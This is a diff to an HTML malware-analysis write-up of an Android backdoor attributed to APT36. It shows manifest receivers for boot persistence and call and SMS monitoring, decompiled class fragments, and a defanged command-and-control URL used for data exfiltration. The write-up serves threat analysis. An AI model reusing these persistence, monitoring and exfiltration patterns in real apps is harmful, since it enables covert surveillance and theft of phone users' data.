@@ -207,14 +207,14 @@ ___________________________________________________________________</pre>
 </i>
 </pre>
     
-    <p>The above defines the sample's entry point via the android.intent.action.MAIN Android Intent:</p>
+    <p>The sample's entry point is defined within the manifest via the `android.intent.action.MAIN` Intent:</p>
     
            <pre class="hack dark"><i>
 android.intent.action.MAIN on com.example.redcated.redacted.MainActivity
 </i>
 </pre>
     
-    <p>The above defines the registered broadcast recievers to be used for malicious intent:</p>
+    <p>The sample's manifest defines the registered device broadcast recievers to be used for malicious intent:</p>
     
            <pre class="hack dark"><i>
 android.intent.action.BOOT_COMPLETED         [ON BOOT COMPLETE EVENT USED FOR MALWARE PERSISTENCE]
@@ -223,7 +223,7 @@ android.intent.action.PHONE_STATE.           [RECEIVER FOR DEVICE PHONE CALL MON
 </i>
 </pre>
     
-    <p>After decompiling the sample's DEX/SMALI to readable JAVA/Kotlin classes, the entry point, being, the `MainActivity` class defined by Android's "MAIN" intent contains and `onCreate()` method invoking the `CMDService` class, of which is also invoked via the `onResume()` and `onStart()` method within the sample's `MainActivity` class. The following represents the `onCreate()` method which is executed upon the APK being compiled by Android's JVM environment.
+    <p>After decompiling the sample's DEX (Dalvik bytecode), SMALi/baksmali to readable JAVA/Kotlin classes; the entry point, being, the `MainActivity` class defined by `android.intent.action.MAIN` is seen to contain an `onCreate()` method invoking another class, being `CMDService` class, of which, is also invoked via the `onResume()` and `onStart()` method within the same `MainActivity` class. The following represents the `onCreate()` method which is immediatley called by Android's javac/kotlinc compiler and executed on the JVM: 
       
           <pre class="hack dark"><i>
   protected void onCreate(android.os.Bundle p9) {
@@ -237,7 +237,7 @@ android.intent.action.PHONE_STATE.           [RECEIVER FOR DEVICE PHONE CALL MON
 </i>
 </pre>
       
-      Following the callback to the `CMDService` class, we can see the sample defines Command and Control (C2) capabilities as well as instantiates programmatic `IF/ELSE` conditional statement clauses for C2 flow prior to data exfiltration to the remote C2:</p>
+      Following the callback to the `CMDService` class defined within the above `onCreate()` method, we can see the sample defines Command and Control (C2) capabilities as well as instantiates programmatic `IF/ELSE`, `CASE/SWITCH` conditional statement for C2 flow. These C2 clauses execute depending on the input recieved by the remote C2 server that in the control of APT36. Note; the below class has been truncated for brevity, while still highlighting a portion of the sample's backdoor capabilities:</p>
 
     <pre class="hack dark"><i>
   public constructor com.example.redacted.redacted.CMDService() {
@@ -861,7 +861,7 @@ android.intent.action.PHONE_STATE.           [RECEIVER FOR DEVICE PHONE CALL MON
 </i>
 </pre>
     
-    <p>In addition to the above, the sample contains a `CallMonitor` class and a `SMSMonitor` class, both of which, define a HTTP asynchronous task containing callbacks to another class titled `setting`. This `setting` class defines the adversary's remote C2 within the `webUrl` parameter and is leveraged for C2 input alongside data exfiltration mechanics.</p>
+    <p>In addition to the above, the sample contains a `CallMonitor` class and a `SMSMonitor` class, these classes are associated with registered broadcast recievers permiting real-time monitoring of inbound phone calls and SMS messages. Both of these receivers define a HTTP asynchronous task containing callbacks to another class titled `setting`. This `setting` class defines the adversary's remote C2 within the `webUrl` parameter and is leveraged for C2 input alongside data exfiltration mechanics from data extracted from the device. The nested CallMonitor$HttpAsyncTask class ilustrates this below:</p>
     
     <pre class="hack dark"><i>
 public class com.example.redacted.redacted.CallMonitor$HttpAsyncTask extends android.os.AsyncTask {
@@ -885,11 +885,11 @@ public class com.example.redacted.redacted.CallMonitor$HttpAsyncTask extends and
 }
 </i>
 </pre>
-    <p>The above contains ` v14_2.<init>(com.example.appcode.appcode.setting.weburl);`, a callback to the `setting` class where webUrl is defined and used for input and data exfiltration over the HTTP protocol. This class (truncated) defines the remote C2 amongst other target device specifics:</p>
+    <p>Following the callback `v14_2.<init>(com.example.appcode.appcode.setting.weburl);`, highlights the remote C2 source, a hard-coded static value, defined within a webUrl parameter within the referenced `setting` class (truncated for brevity):</p>
      <pre class="hack dark"><i>
 static {
     com.example.redacted.redacted.setting.verion = "1.0.0.0";
-    com.example.redacted.redacted.setting.weburl = "http[:]//android[.]viral91[.]xyz/admin/webservices";
+    com.example.redacted.redacted.setting.weburl = "http[:]//android[.]viral91[.]xyz/admin/webservices";      [REMOTE C2 FOR COMMAND EXECUTION AND DATA EXFILTRATION]
     com.example.redacted.redacted.setting.errors = 0;
     com.example.redacted.redacted.setting.imi = "";
     com.example.redacted.redacted.setting.os = "";
